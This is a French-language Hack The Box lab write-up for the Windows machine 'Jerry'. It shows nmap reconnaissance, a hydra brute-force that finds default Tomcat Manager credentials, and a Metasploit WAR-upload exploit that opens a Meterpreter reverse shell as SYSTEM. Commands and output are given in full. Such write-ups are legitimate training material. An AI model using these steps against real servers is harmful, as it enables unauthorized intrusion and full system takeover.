# Jerry

> **Statut** : [x] Root
> **OS** : Windows Server 2012 R2
> **Difficulte** : Easy
> **HTB** : https://app.hackthebox.com/machines/Jerry
> **Difficulte ressentie** : 2/10
> **IP** : 10.129.10.22

---

## Reconnaissance

### Nmap - scan initial

```bash
nmap -sV -sC -Pn 10.129.10.22
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
```

> **Note** : l'option `-Pn` est necessaire car la box ne repond pas aux ping probes de nmap (malgre un `ping` ICMP fonctionnel).

Un scan complet (`-p-`) ne revele aucun port supplementaire. Seul le port 8080 est expose.

### Analyse

- **OS** : Windows Server 2012 R2 (identifie via le shell Meterpreter)
- **Surface d'attaque** : Apache Tomcat 7.0.88 sur le port 8080
- **Indices cles** :
  - Tomcat 7.0.88 expose le Manager (`/manager/html`) et le Host Manager (`/host-manager/html`)
  - Ces interfaces sont protegees par une authentification HTTP Basic

---

## Exploitation

### Brute-force des credentials Tomcat

Hydra est utilise pour tester des combinaisons username/password courantes sur l'interface du Manager :

```bash
hydra -L user.txt -P pass.txt -s 8080 $IP http-get /manager/html
```

Resultat : **2 paires valides** trouvees :

```
[8080][http-get] host: 10.129.10.22   login: admin     password: admin
[8080][http-get] host: 10.129.10.22   login: tomcat    password: s3cret
```

> **Note** : avec `-f`, hydra s'arrete au premier succes. Sans `-f`, toutes les combinaisons sont testees - ce qui permet de decouvrir les deux comptes valides.

- `admin:admin` - s'authentifie mais retourne un **403 Forbidden** sur le Manager (droits insuffisants)
- `tomcat:s3cret` - acces complet au Tomcat Manager

### Vecteur d'attaque

**Tomcat Manager Authenticated Upload** : le Manager de Tomcat permet de deployer des fichiers WAR (Web Application Archive). Avec des credentials valides, il est possible d'uploader un WAR contenant un reverse shell JSP, ce qui donne une execution de code a distance.

- EDB : https://www.exploit-db.com/exploits/31433
- Rapid7 : https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
- Reverse shells : https://www.revshells.com/

### Exploitation avec Metasploit

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.129.10.22
set RPORT 8080
set LHOST 10.10.14.182
set LPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
run
```

```
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying VxtQk6xXqfNA...
[*] Executing VxtQk6xXqfNA...
[*] Undeploying VxtQk6xXqfNA ...
[*] Sending stage (58073 bytes) to 10.129.10.22
[*] Meterpreter session 1 opened (10.10.14.182:8080 -> 10.129.10.22:49192)
```

L'exploit uploade un WAR malveillant via le Manager, l'execute, puis le supprime automatiquement. Le Meterpreter retourne directement avec les privileges **NT AUTHORITY\SYSTEM**.

```
meterpreter > shell
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

---

## Privilege Escalation

Aucune escalade de privileges necessaire - Tomcat tourne en tant que **SYSTEM**, l'exploit donne donc directement les privileges maximaux.

---

## Flags

Les deux flags sont dans un seul fichier sur le bureau de l'administrateur :

```
C:\Users\Administrator\Desktop\flags> type "2 for the price of 1.txt"
user.txt
[REDACTED]

root.txt
[REDACTED]
```

- **User** : `[REDACTED]`
- **Root** : `[REDACTED]`

---

## Lecons apprises

- **Tomcat Manager = deploiement de WAR** : des qu'un acces au Tomcat Manager est obtenu, le deploiement d'un WAR malveillant est le vecteur d'exploitation standard. Le module `tomcat_mgr_upload` de Metasploit automatise entierement le processus.
- **Credentials par defaut** : Tomcat est souvent installe avec des credentials faibles (`tomcat:s3cret`, `admin:admin`, `tomcat:tomcat`). Toujours tester les combinaisons courantes avec hydra ou manuellement.
- **Plusieurs comptes, droits differents** : `admin:admin` s'authentifie mais n'a pas les droits sur le Manager (403). Ne pas s'arreter au premier compte valide - tester tous les credentials decouverts.
- **`-Pn` sur nmap** : certaines boxes Windows bloquent les ping probes de nmap tout en repondant au ping ICMP classique. Toujours ajouter `-Pn` si nmap reporte "Host seems down".
- **Tomcat en SYSTEM** : sur les installations Windows par defaut, Tomcat tourne souvent en tant que SYSTEM, ce qui elimine le besoin d'escalade de privileges.
